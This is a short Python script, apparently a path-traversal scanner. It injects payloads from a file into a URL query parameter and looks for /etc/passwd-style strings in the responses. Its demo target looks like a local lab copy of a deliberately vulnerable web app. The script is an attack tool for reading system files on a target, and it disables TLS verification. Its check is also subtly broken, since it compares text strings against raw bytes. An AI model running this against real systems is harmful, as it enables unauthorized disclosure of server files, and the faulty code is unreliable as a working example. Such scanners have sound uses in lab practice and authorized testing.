import requests
import os
import re


heuristic_messages = ["root", "www-data", "var/", "www/", 
                      "bin/", "usr/", "bash", "sbin",
                      "/home", "nologin", "systemd", "/lib",
                      "mysql"
                      ]


def path_traversal(url):
    """
    Return vulnurable path traversal urls.
    """

    with open(os.path.abspath(os.getcwd()) + "/assets/paths.txt", "r") as f:
        path_payload = f.readlines()

    for payload in path_payload:
        payload = payload.split("\n")[0]
        try:
            url_before_param = url.find("=")
            traversal_url = url[:url_before_param + 1] + payload
            response = requests.get(traversal_url, verify=False)

            for snippet in heuristic_messages:
                html_text = response.content.lower()
                # checks

                if traversal_url == response.url:
                    if snippet in html_text and "not found" not in html_text:
                        sentence = re.findall(rf"([^.]*?{snippet}[^.]*\.)", html_text)
                        print(f"Directory traversal possible, path: {traversal_url}")
                        print("Response: ", sentence)
                        return snippet
                else:
                    print(f"Path traversal using {payload} not possible, redirected to {response.url}")

        except KeyboardInterrupt:
            return


if __name__ == "__main__":
    path_traversal("http://172.17.0.2/vulnerabilities/fi/?page=include.php")